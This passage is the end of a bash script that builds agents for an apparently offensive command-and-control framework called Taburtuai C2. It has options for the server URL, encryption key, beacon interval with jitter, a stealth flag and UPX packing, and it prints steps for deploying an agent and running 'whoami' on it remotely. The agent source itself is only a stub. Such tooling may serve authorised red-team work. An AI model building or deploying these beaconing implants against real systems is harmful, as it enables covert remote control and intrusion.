    echo -e "  File Size:       ${YELLOW}$file_size${NC}"
    echo -e "  Server URL:      ${YELLOW}$SERVER_URL${NC}"
    echo -e "  Encryption Key:  ${YELLOW}${KEY:0:8}...${NC}"
    echo -e "  Beacon Interval: ${YELLOW}${INTERVAL}s${NC}"
    echo -e "  Jitter:          ${YELLOW}${JITTER}${NC}"
    echo ""
    echo -e "${BLUE}Features:${NC}"
    echo -e "  ${GREEN}✓${NC} UUID-based agent identification"
    echo -e "  ${GREEN}✓${NC} Enhanced communication protocol"
    echo -e "  ${GREEN}✓${NC} Command execution with decryption support"
    echo -e "  ${GREEN}✓${NC} Configurable beacon intervals with jitter"
    echo -e "  ${GREEN}✓${NC} Cross-platform compatibility"
    echo ""
    echo -e "${BLUE}Next Steps:${NC}"
    echo -e "  ${GREEN}1.${NC} Deploy: ${YELLOW}$BUILD_DIR/$OUTPUT_NAME${NC}"
    echo -e "  ${GREEN}2.${NC} Monitor: ${YELLOW}taburtuai-cli agents list${NC}"
    echo -e "  ${GREEN}3.${NC} Execute: ${YELLOW}taburtuai-cli cmd [agent-id] \"whoami\"${NC}"
    echo -e "  ${GREEN}4.${NC} Dashboard: ${YELLOW}$SERVER_URL${NC}"
    echo ""
}

parse_args() {
    # Set defaults
    SERVER_URL="$DEFAULT_SERVER_URL"
    KEY="$DEFAULT_KEY"
    INTERVAL="$DEFAULT_INTERVAL"
    JITTER="$DEFAULT_JITTER"
    TARGET_OS=$(go env GOOS 2>/dev/null || echo "linux")
    TARGET_ARCH="amd64"
    OUTPUT_NAME=""
    STEALTH=false
    COMPRESS=false
    
    while [[ $# -gt 0 ]]; do
        case $1 in
            -s|--server)
                SERVER_URL="$2"
                shift 2
                ;;
            -k|--key)
                KEY="$2"
                shift 2
                ;;
            -i|--interval)
                INTERVAL="$2"
                shift 2
                ;;
            -j|--jitter)
                JITTER="$2"
                shift 2
                ;;
            -o|--os)
                TARGET_OS="$2"
                shift 2
                ;;
            -a|--arch)
                TARGET_ARCH="$2"
                shift 2
                ;;
            -n|--name)
                OUTPUT_NAME="$2"
                shift 2
                ;;
            -S|--stealth)
                STEALTH=true
                shift
                ;;
            -c|--compress)
                COMPRESS=true
                shift
                ;;
            -h|--help)
                show_usage
                exit 0
                ;;
            *)
                print_error "Unknown option: $1"
                show_usage
                exit 1
                ;;
        esac
    done
}

check_dependencies() {
    print_status "Checking build dependencies..."
    
    if ! command -v go >/dev/null 2>&1; then
        print_error "Go is not installed or not in PATH"
        exit 1
    fi
    
    local go_version=$(go version | grep -oE 'go[0-9]+\.[0-9]+' | sed 's/go//')
    print_success "Go $go_version found"
    
    if [ "$COMPRESS" = true ] && ! command -v upx >/dev/null 2>&1; then
        print_warning "UPX not found - compression will be skipped"
        COMPRESS=false
    fi
}

debug_config() {
    if [ "${VERBOSE:-false}" = true ]; then
        echo ""
        echo -e "${BLUE}Debug Configuration:${NC}"
        echo -e "  Server URL: ${YELLOW}$SERVER_URL${NC}"
        echo -e "  Encryption Key: ${YELLOW}${KEY:0:8}...${NC}"
        echo -e "  Target OS: ${YELLOW}$TARGET_OS${NC}"
        echo -e "  Target Arch: ${YELLOW}$TARGET_ARCH${NC}"
        echo -e "  Interval: ${YELLOW}$INTERVAL${NC}"
        echo -e "  Jitter: ${YELLOW}$JITTER${NC}"
        echo -e "  Stealth: ${YELLOW}$STEALTH${NC}"
        echo -e "  Compress: ${YELLOW}$COMPRESS${NC}"
        echo ""
    fi
}

main() {
    echo -e "${BLUE}"
    cat << 'HEADER_EOF'
╔══════════════════════════════════════════════════════════════════╗
║               Enhanced Agent Build Script v2.2                  ║
║                    Taburtuai C2 - Phase 2A                      ║
╚══════════════════════════════════════════════════════════════════╝
HEADER_EOF
    echo -e "${NC}"
    
    parse_args "$@"
    debug_config
    check_dependencies
    validate_params
    setup_build_env
    create_agent_source
    prepare_source
    build_agent
    compress_binary
    show_summary
    
    print_success "Enhanced agent build completed successfully!"
    echo ""
    echo -e "${YELLOW}Note: Remember to add the Go source code to create_agent_source() function${NC}"
    echo -e "${YELLOW}      The agent source should include decryption capabilities${NC}"
}

main "$@"
